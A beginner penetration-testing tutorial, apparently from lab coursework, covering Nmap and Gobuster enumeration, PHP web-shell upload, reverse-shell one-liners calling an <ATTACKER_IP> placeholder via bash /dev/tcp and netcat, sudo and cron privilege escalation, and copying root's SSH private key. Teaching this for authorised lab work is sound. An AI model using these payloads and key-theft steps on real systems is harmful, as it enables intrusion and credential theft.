# Getting Started with Penetration Testing – A Practical Walkthrough

This document summarizes the **core concepts, techniques, and tools** covered in a beginner‑friendly penetration testing course. It follows a typical assessment flow: enumeration → web exploitation → privilege escalation → reporting. The aim is to provide a repeatable methodology and a solid foundation for tackling real‑world (or lab) targets.

---

## 📌 Table of Contents

1.  [The Pentesting Process](#-the-pentesting-process)
2.  [Essential Tools & Setup](#-essential-tools--setup)
3.  [Phase 1 – Enumeration](#-phase-1--enumeration)
    -   Service Scanning (Nmap)
    -   Web Footprinting (whatweb, cURL, Gobuster)
4.  [Phase 2 – Web Exploitation](#-phase-2--web-exploitation)
    -   CMS Identification & Public Exploits
    -   File Upload → Web Shell → Reverse Shell
5.  [Phase 3 – Post‑Exploitation & Privilege Escalation](#-phase-3--postexploitation--privilege-escalation)
    -   Linux Privesc Checklist
    -   Sudo Misconfigurations
    -   Cron Job Hijacking (PATH, writable scripts)
    -   SSH Key Theft
6.  [Phase 4 – Reporting & Cleanup](#-phase-4--reporting--cleanup)
7.  [Common Pitfalls & Tips](#-common-pitfalls--tips)
8.  [Key Commands Cheat Sheet](#-key-commands-cheat-sheet)

---

## 🔄 The Pentesting Process

A penetration test follows these iterative stages:

1.  **Pre‑Engagement** – Define scope, rules, and objectives.
2.  **Information Gathering** – Collect as much data as possible (OSINT, scanning, enumeration).
3.  **Vulnerability Assessment** – Identify weaknesses in services and applications.
4.  **Exploitation** – Gain initial access (foothold).
5.  **Post‑Exploitation** – Enumerate the system for privilege escalation, lateral movement, and sensitive data.
6.  **Proof‑of‑Concept** – Demonstrate the impact and provide remediation steps.
7.  **Reporting** – Deliver a clear, detailed report to the client.

> **Key mindset:** Enumeration is **iterative**. You will cycle back to gathering new information after each step. Take thorough notes and save all output.

---

## 🧰 Essential Tools & Setup

| Tool        | Purpose                                      |
|-------------|----------------------------------------------|
| Nmap        | Port scanning, service detection, scripting  |
| Netcat (nc) | Banner grabbing, reverse/bind shells         |
| Gobuster    | Directory/subdomain brute‑forcing            |
| whatweb     | Web technology fingerprinting                |
| cURL        | HTTP requests, header inspection             |
| wget        | File transfers                               |
| searchsploit| Offline exploit lookup (Exploit‑DB)          |
| Metasploit  | Exploit development and execution            |
| LinPEAS     | Linux privilege escalation auditing          |
| Python3     | Reverse shells, TTY upgrades, HTTP servers   |

**VPN & Lab Setup**  
Always connect via a dedicated VPN (e.g., OpenVPN) to access the target network. In HTB Academy, use the provided `.ovpn` file. Verify connectivity with `ip a show tun0` and `ping <target_ip>` (if ICMP is allowed; otherwise use `-Pn` in Nmap).

---

## 🔍 Phase 1 – Enumeration

### 1.1 Service Scanning (Nmap)

Start with a quick scan of common ports:

```bash

nmap -sV --open -T4 -Pn -p 80,443,22,21,445,139,3306,8080,8000 <target_ip>

If no results, run a full TCP port scan (faster with --min-rate):

bash
nmap -p- --min-rate 1000 -T4 -Pn <target_ip>
Once open ports are known, perform a version and script scan:

bash
nmap -sV -sC -p <port1>,<port2> -Pn <target_ip>
Example output:
22/tcp open ssh OpenSSH 8.2p1 Ubuntu
80/tcp open http Apache httpd 2.4.41 → web server is present.

1.2 Web Footprinting
Check the main page:

bash
curl -s http://<target_ip> | head
whatweb http://<target_ip>
Look for hidden comments in HTML source:

bash
curl -s http://<target_ip> | grep -i "<!--"
Check common files: /robots.txt, /README, /sitemap.xml, /admin.php, /wp-admin, etc.

Directory Brute‑Forcing with Gobuster:

bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50
Interesting directories often include: /admin, /content, /plugins, /theme, /backups, /data.

1.3 Identify the CMS / Technology
Use whatweb and manual browsing to spot frameworks like Nibbleblog, WordPress, GetSimple CMS, etc.

Check version information in README, changelog, or source code comments.

💻 Phase 2 – Web Exploitation
2.1 Public Exploits
Use searchsploit to find known vulnerabilities for the identified software:

bash
searchsploit <cms> <version>
# e.g., searchsploit nibbleblog 4.0.3
Common attack paths:

File upload → upload a PHP web shell.

Admin login with default/weak credentials (e.g., admin:admin, admin:nibbles).

Authenticated RCE via theme or plugin editing.

2.2 Manual File Upload → Web Shell
In the admin panel, locate an upload feature (e.g., a plugin that accepts images).

Create a PHP file containing:

php
<?php system($_GET['cmd']); ?>
Upload it. The file may be renamed (e.g., to image.php).

Test command execution:

bash
curl "http://<target_ip>/path/to/uploaded_file.php?cmd=id"
If you see uid=33(www-data), you have RCE.

2.3 Upgrade to a Reverse Shell
Step A – Start a listener on your attack machine:

bash
nc -lvnp 4444
Step B – Inject a reverse shell payload into the PHP file (or via ?cmd=).
Common one‑liners:

Bash TCP (reliable if /dev/tcp is available):

php
<?php system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"); ?>
Python (if bash is blocked):

python
python3 -c 'import socket,subprocess,os;s=socket.socket(...); ...'
Netcat (if installed):

php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"); ?>
Step C – Trigger the shell by visiting the file or using cURL:

bash
curl "http://<target_ip>/path/to/shell.php"
Your listener will catch the connection.

2.4 Upgrade TTY (Interactive Shell)
After catching the shell, upgrade to a fully interactive terminal:

bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background, then:
stty raw -echo
fg
# Press Enter twice, then:
export TERM=xterm-256color
Now you can use tab completion, Ctrl+C, and sudo properly.

🔓 Phase 3 – Post‑Exploitation & Privilege Escalation
Once inside as a low‑privileged user (www-data, nibbler, user2), we need to become root.

3.1 Sudo Misconfigurations
bash
sudo -l
If you see (ALL : ALL) NOPASSWD: /usr/bin/php, you can spawn a shell:

bash
sudo /usr/bin/php -r "system('/bin/bash -i');"
If you see (root) NOPASSWD: /usr/bin/find, use:

bash
sudo find . -exec /bin/bash \; -quit
Other common binaries: python, perl, vi, nano, less, more → check GTFOBins.

3.2 Cron Job Hijacking
Look for cron jobs that run as root:

bash
cat /etc/crontab
ls -la /etc/cron.d/
If you find a script that is writable by your user, inject a reverse shell payload.

If a script uses commands like find or rm without absolute paths, you can hijack the PATH:

Create a malicious script named find in /tmp:
bash
echo '#!/bin/bash' > /tmp/find
echo 'cat /root/flag.txt > /tmp/root_flag.txt' >> /tmp/find
chmod +x /tmp/find
Set PATH=/tmp:$PATH (only works if cron inherits your environment, which is rare; but in some environments, it does).
Wait for the cron job to run, then read the output.
Important: In many Academy containers, cron is disabled or runs in a different environment. Always verify with ps aux | grep cron.

3.3 SSH Key Theft
Check if you can read /root/.ssh/id_rsa:

bash
ls -la /root/.ssh/
If readable, copy the key to your attack machine:

bash
cat /root/.ssh/id_rsa
# Save to id_rsa and set permissions:
chmod 600 id_rsa
# SSH as root:
ssh root@<target_ip> -i id_rsa -p <port>
3.4 LinPEAS – Automated Enumeration
If outbound connectivity is allowed, download and run LinPEAS for a comprehensive audit:

bash
# On attack machine:
python3 -m http.server 8000

# On target:
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
Manual checks are often faster when networking is restricted; focus on:

sudo -l

Cron jobs

SUID binaries (find / -perm -4000 -type f 2>/dev/null)

Writable files/directories

Exposed credentials in config files

History files

📊 Phase 4 – Reporting & Cleanup
Document every step – commands used, outputs, screenshots.

Include a clear attack chain from enumeration to root.

Provide remediation recommendations (e.g., disable weak passwords, restrict sudo, set proper file permissions).

Clean up any uploaded files or added backdoors.

⚠️ Common Pitfalls & Tips
Pitfall	How to Avoid
Forgetting -Pn on Nmap	If ping fails, add -Pn to skip host discovery.
Using the wrong VPN file	Ensure you are on the Academy VPN for lab targets.
Not checking page source comments	Hidden directories are often revealed here.
Over‑relying on automated tools	Manually verify each finding.
Reverse shell not connecting	Check IP, port, firewall; use a different payload (Bash/Python/Netcat).
SSH key permissions too open	Always chmod 600 id_rsa before using.
Forgetting to upgrade TTY	Use python3 -c 'import pty; pty.spawn("/bin/bash")' for a stable shell.
Not taking notes	Save all output – it’s essential for reporting.
📋 Key Commands Cheat Sheet
bash
# Enumeration
nmap -sV --open -T4 -Pn -p 80,443,22 <target>
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 50
whatweb http://<target>
curl -s http://<target> | grep -i "<!--"

# File upload / RCE test
curl "http://<target>/path/shell.php?cmd=id"

# Reverse shell listener
nc -lvnp 4444

# Upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# PrivEsc
sudo -l
cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null
cat /root/.ssh/id_rsa

# SSH as root (once key obtained)
chmod 600 id_rsa
ssh root@<target> -i id_rsa -p <port>
🏁 Final Thoughts
The journey from a blank IP address to a root shell is built on systematic enumeration and creative thinking. Always:

Start broad, then narrow down.

Validate every finding with manual checks.

Practice, practice, practice – the real skill is in the methodology, not just the tools.

Happy hacking, and remember to always stay ethical and within scope
